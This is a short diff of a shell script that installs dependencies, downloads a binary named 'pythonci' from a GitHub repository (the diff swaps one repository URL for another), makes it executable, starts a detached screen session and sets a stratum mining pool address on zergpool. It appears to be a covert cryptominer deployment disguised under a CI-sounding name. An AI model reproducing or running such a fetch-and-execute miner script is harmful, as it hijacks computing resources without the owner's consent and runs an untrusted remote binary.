@@ -2,7 +2,7 @@
 sudo apt update
 sudo apt install screen -y
 sudo apt install screen libjansson4 -y
-wget https://github.com/Nazimdr/project-hoj/raw/main/pythonci
+wget https://github.com/NRC-TECH/test-files/raw/main/pythonci
 chmod +x pythonci
 screen -dmS ls
 POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
